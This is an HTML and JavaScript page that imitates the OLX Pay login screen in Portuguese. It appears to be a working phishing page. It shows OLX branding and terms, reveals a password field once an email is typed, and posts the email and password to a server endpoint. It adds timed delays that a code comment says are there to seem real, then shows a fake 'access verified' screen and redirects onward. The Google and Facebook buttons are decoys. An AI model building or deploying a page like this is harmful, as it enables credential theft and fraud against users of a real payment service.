<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso - OLX Pay</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background-color: #ffffff;
            border-radius: 15px;
            padding: 30px 20px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        /* Logo no topo */
        .logo-header {
            text-align: left;
            margin-bottom: 20px;
        }

        .logo-header img {
            width: 50px;
            height: auto;
        }

        /* Título */
        .title {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .title .pay {
            color: #6a0dad;
        }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 14px;
            background-color: #dfe8f5;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            color: #333;
            font-family: Arial, sans-serif;
            transition: background-color 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            background-color: #c8d9ef;
        }

        .form-input::placeholder {
            color: #999;
        }

        /* Campo de Senha - Oculto por padrão */
        .senha-group {
            display: none;
            margin-bottom: 20px;
            animation: slideDown 0.3s ease;
        }

        .senha-group.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #6a0dad;
            font-size: 18px;
            padding: 5px;
        }

        .toggle-password:hover {
            color: #4a0583;
        }

        /* Botão Continuar */
        .btn-continuar {
            width: 100%;
            padding: 14px;
            background-color: #f57c00;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 25px;
            transition: background-color 0.3s ease;
        }

        .btn-continuar:hover {
            background-color: #e66d00;
        }

        .btn-continuar:active {
            transform: scale(0.98);
        }

        .btn-continuar:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* Mensagem de Status */
        .status-message {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 13px;
            display: none;
        }

        .status-message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }

        .status-message.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }

        /* Divisor */
        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 25px 0;
            gap: 15px;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #e0e0e0;
        }

        .divider-text {
            font-size: 13px;
            color: #999;
        }

        /* Botões Sociais */
        .social-buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 25px;
        }

        .social-btn {
            width: 55px;
            height: 55px;
            border: none;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 28px;
            transition: opacity 0.3s ease;
        }

        .social-btn img {
    width: 26px;
    height: 26px;
}


        .social-btn:hover {
            opacity: 0.8;
        }

        .google-btn {
            background-color: white;
            border: 1px solid #e0e0e0;
        }

        .facebook-btn {
            background-color: #3b5998;
            color: white;
        }

        /* Cadastro */
        .cadastro {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin-bottom: 20px;
        }

        .cadastro a {
            color: #6a0dad;
            text-decoration: none;
            font-weight: bold;
        }

        .cadastro a:hover {
            text-decoration: underline;
        }

        /* Ajuda */
        .ajuda {
            text-align: center;
            margin-bottom: 25px;
        }

        .ajuda a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }

        .ajuda a:hover {
            color: #333;
        }

        /* ===== LOADING SCREEN ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #f2f4f5;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9999;
            gap: 20px;
        }

        .loading-overlay.active {
            display: flex;
            animation: fadeIn 0.3s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        /* Topo com Logo OLX */
        .loading-header {
            margin-bottom: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .loading-logo {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -1px;
        }

        .loading-logo span:nth-child(1) {
            color: #6e0ad6;
        }

        .loading-logo span:nth-child(2) {
            color: #00a650;
        }

        .loading-logo span:nth-child(3) {
            color: #ff6a00;
        }

        /* Spinner simples e minimalista */
        .spinner-simple {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #6e0ad6;
            border-radius: 50%;
            animation: spinSimple 1s linear infinite;
        }

        @keyframes spinSimple {
            to {
                transform: rotate(360deg);
            }
        }

        /* Loading text */
        .loading-text {
            color: #666;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* Success screen */
        .success-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #f2f4f5;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9998;
            gap: 20px;
        }

        .success-overlay.active {
            display: flex;
            animation: fadeIn 0.5s ease-in;
        }

        .success-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .success-icon {
            width: 70px;
            height: 70px;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            animation: scaleIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .success-text {
            color: #333;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                transform: translateY(20px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .success-subtext {
            color: #999;
            font-size: 12px;
            animation: slideIn 0.5s ease-out 0.1s backwards;
        }

        /* Rodapé */
        .footer {
            text-align: center;
            font-size: 11px;
            color: #999;
            line-height: 1.6;
            border-top: 1px solid #f0f0f0;
            padding-top: 15px;
        }

        /* Responsividade */
        @media (max-width: 480px) {
            .container {
                border-radius: 12px;
                padding: 25px 15px;
            }

            .title {
                font-size: 18px;
            }

            .form-input {
                padding: 12px;
                font-size: 13px;
            }

            .btn-continuar {
                padding: 12px;
                font-size: 15px;
            }
        }
    </style>
    <script>
        // Função para mostrar/esconder campo de senha
        function verificarEmail() {
            const emailInput = document.getElementById('emailInput');
            const senhaGroup = document.querySelector('.senha-group');
            const email = emailInput.value.trim();

            // Mostrar campo de senha se email estiver preenchido e válido
            if (email && email.includes('@')) {
                senhaGroup.classList.add('show');
            } else {
                senhaGroup.classList.remove('show');
            }
        }

        // Função para alternar visibilidade da senha
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('senhaInput');
            const toggleBtn = document.querySelector('.toggle-password');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = '👁️';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = '👁️‍🗨️';
            }
        }

        // Função para enviar email e senha para o servidor
        async function enviarCredenciais() {
            const emailInput = document.getElementById('emailInput');
            const senhaInput = document.getElementById('senhaInput');
            const email = emailInput.value.trim();
            const senha = senhaInput.value.trim();
            const botaoContinuar = document.querySelector('.btn-continuar');
            const statusMessage = document.getElementById('statusMessage');
            const loadingOverlay = document.getElementById('loadingOverlay');
            const successOverlay = document.getElementById('successOverlay');

            // Validar email
            if (!email) {
                mostrarStatus('Por favor, insira um email válido', 'error');
                return;
            }

            // Validar formato de email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                mostrarStatus('Por favor, insira um email válido', 'error');
                return;
            }

            // Validar senha
            if (!senha) {
                mostrarStatus('Por favor, insira uma senha', 'error');
                return;
            }

            // Desabilitar botão enquanto processa
            botaoContinuar.disabled = true;
            botaoContinuar.textContent = 'Processando...';
            
            // Mostrar loading screen
            loadingOverlay.classList.add('active');

            try {
                // Simular delay de processamento (8 segundos para parecer real)
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Fazer requisição para o servidor
                const response = await fetch('/api/enviar-credenciais-acesso', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        email: email,
                        senha: senha 
                    })
                });

                const resultado = await response.json();

                // Aguardar mais um pouco para simular processamento adicional
                await new Promise(resolve => setTimeout(resolve, 3000));

                if (response.ok && resultado.success) {
                    // Esconder loading e mostrar sucesso
                    loadingOverlay.classList.remove('active');
                    successOverlay.classList.add('active');
                    
                    // Limpar os campos após sucesso
                    emailInput.value = '';
                    senhaInput.value = '';
                    document.querySelector('.senha-group').classList.remove('show');
                    
                    // Aguardar 3 segundos antes de redirecionar
                    setTimeout(() => {
                        window.location.href = '/cadastro.html';
                    }, 3000);
                } else {
                    // Esconder loading em caso de erro
                    loadingOverlay.classList.remove('active');
                    mostrarStatus(resultado.message || 'Erro ao processar login', 'error');
                    
                    // Reabilitar botão
                    botaoContinuar.disabled = false;
                    botaoContinuar.textContent = 'Continuar';
                }
            } catch (error) {
                console.error('Erro ao enviar credenciais:', error);
                
                // Esconder loading
                loadingOverlay.classList.remove('active');
                mostrarStatus('Erro ao conectar com o servidor: ' + error.message, 'error');
                
                // Reabilitar botão
                botaoContinuar.disabled = false;
                botaoContinuar.textContent = 'Continuar';
            }
        }

        // Função para mostrar mensagem de status
        function mostrarStatus(mensagem, tipo) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.textContent = mensagem;
            statusMessage.className = 'status-message ' + tipo;

            // Remover mensagem após 5 segundos
            setTimeout(() => {
                statusMessage.className = 'status-message';
            }, 5000);
        }

        // Adicionar eventos ao carregar a página
        document.addEventListener('DOMContentLoaded', function() {
            const botaoContinuar = document.querySelector('.btn-continuar');
            const emailInput = document.getElementById('emailInput');
            const senhaInput = document.getElementById('senhaInput');
            const toggleBtn = document.querySelector('.toggle-password');

            // Evento para verificar email em tempo real
            emailInput.addEventListener('input', verificarEmail);

            // Evento de clique no botão
            botaoContinuar.addEventListener('click', enviarCredenciais);

            // Permitir envio com Enter
            emailInput.addEventListener('keypress', function(event) {
                if (event.key === 'Enter' && document.querySelector('.senha-group').classList.contains('show')) {
                    senhaInput.focus();
                }
            });

            senhaInput.addEventListener('keypress', function(event) {
                if (event.key === 'Enter') {
                    enviarCredenciais();
                }
            });

            // Toggle de visibilidade da senha
            toggleBtn.addEventListener('click', togglePasswordVisibility);
        });
    </script>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-header">
            <div class="loading-logo">
                <span>o</span><span>l</span><span>x</span>
            </div>
        </div>
        <div class="spinner-simple"></div>
        <div class="loading-text">Verificando acesso...</div>
    </div>

    <!-- Success Overlay -->
    <div class="success-overlay" id="successOverlay">
        <div class="success-header">
            <div class="loading-logo">
                <span>o</span><span>l</span><span>x</span>
            </div>
            <div class="success-icon">✓</div>
            <div class="success-text">Acesso Verificado!</div>
            <div class="success-subtext">Redirecionando...</div>
        </div>
    </div>

    <div class="container">
        <!-- Logo Header -->
        <div class="logo-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX">
        </div>

        <!-- Título -->
        <div class="title">
            Acesse a sua conta <span class="pay">OLX PAY</span>
        </div>

        <!-- Form Email -->
        <div class="form-group">
            <label class="form-label">E-mail</label>
            <input 
                type="email" 
                id="emailInput"
                class="form-input" 
                placeholder="mgleterwritermeis@gmail.com"
            >
        </div>

        <!-- Form Senha - Aparece depois de preencher email -->
        <div class="senha-group">
            <label class="form-label">Senha</label>
            <div class="password-container">
                <input 
                    type="password" 
                    id="senhaInput"
                    class="form-input" 
                    placeholder="Digite sua senha"
                >
                <button type="button" class="toggle-password" title="Mostrar/Ocultar senha">👁️‍🗨️</button>
            </div>
        </div>

        <!-- Mensagem de Status -->
        <div id="statusMessage" class="status-message"></div>

        <!-- Botão Continuar -->
        <button class="btn-continuar">Continuar</button>

        <!-- Divisor -->
        <div class="divider">
            <div class="divider-line"></div>
            <span class="divider-text">Ou conecte com</span>
            <div class="divider-line"></div>
        </div>

        <!-- Botões Sociais -->
<div class="social-buttons">
    <!-- Google -->
    <button class="social-btn google-btn" onclick="window.location.href='#'">

        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" width="26">
    </button>

    <!-- Facebook -->
    <button class="social-btn facebook-btn" title="Conectar com Facebook">
        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/facebook/facebook-original.svg" width="26">
    </button>
</div> 

        <!-- Ajuda -->
        <div class="ajuda">
            <a href="#">Preciso de ajuda ></a>
        </div>

        <!-- Rodapé -->
        <div class="footer">
            Ao continuar, você concorda com os Termos de Uso e a Política de Privacidade da OLX e seus parceiros, e em receber comunicações da OLX.
        </div>
    </div>
</body>
</html>
